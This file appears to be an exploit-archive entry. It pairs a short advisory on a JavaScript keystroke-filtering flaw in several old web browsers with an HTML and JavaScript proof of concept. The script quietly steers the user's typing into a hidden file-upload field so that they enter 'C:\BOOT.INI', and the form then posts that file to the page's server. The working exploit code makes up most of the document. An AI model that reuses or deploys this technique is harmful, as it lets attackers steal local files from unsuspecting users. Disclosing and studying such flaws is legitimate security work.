@@ -1,0 +1,71 @@
+source: http://www.securityfocus.com/bid/18308/info
+
+Multiple web browsers are prone to a JavaScript key-filtering vulnerability because the browsers fail to securely handle keystroke input from users.
+
+This issue is demonstrated to allow attackers to divert keystrokes from one input form in a webpage to a hidden file-upload dialog in the same page. This may allow remote attackers to initiate file uploads from unsuspecting users. Other attacks may also be possible.
+
+Exploiting this issue requires that users manually type the full path of files that attackers wish to download. This may require substantial typing from targeted users, so attackers will likely use keyboard-based games, blogs, or other similar pages to entice users to enter the required keyboard input to exploit this issue.
+
+Reportedly, Mozilla Suite, Mozilla Firefox, Mozilla SeaMonkey, Netscape Navigator, and Microsoft Internet Explorer are all vulnerable to this issue.
+
+
+<HTML>
+<HEAD>
+<SCRIPT>
+//document.onKeyDown = doKeyPress;
+
+//document.onKeyUp = doKeyUp;
+var saved;
+var e ;
+var mystring = "C:\\BOOT.INI";
+var i=mystring.length-1;
+
+function doKeyPress () {
+e = window.event;
+saved = e.keyCode;
+window.status = "e.keyCode == " + e.keyCode + "character is " +
+mystring.charCodeAt(i);
+if(e.keyCode != mystring.charCodeAt(i))
+    {
+    //e.keyCode =0;
+    e.returnValue=false;
+    e.cancelBubble=true;
+}
+else {
+    i--;
+}
+document.forms[0].fileupload.focus();
+
+}
+
+function doKeyUp () {
+
+document.forms[0].txt.value += String.fromCharCode(saved);
+document.forms[0].txt.focus();
+
+}
+
+function switchtype() {
+  /*  var e = document.getElementById('txt');
+       document.forms[0].txt.setAttribute("type", "file");
+       e.setAttribute("value", "asfasfsd");
+  */
+}
+
+function fux0rKeys() {
+   }
+</SCRIPT>
+</HEAD>
+<BODY onload="document.forms[0].txt.value='sometext';
+document.forms[0].fileupload.value='asdfsdfadsf';">
+<FORM METHOD=POST action=file.php>
+<INPUT id='asdf' name="fileupload" defaultValue='asdfasdf' TYPE=FILE
+OnKeyUp="doKeyUp();"
+OnKeyPress="doKeyPress();">
+<input name=txt id='txt' type=text value='asdfsdafasdf'
+OnKeyDown="document.forms[0].fileupload.focus();"
+asdfnKeyDown="document.forms[0].txt.fireEvent('onKeyPress');"
+onClick=""> visible
+</FORM>
+</BODY>
+</HTML>
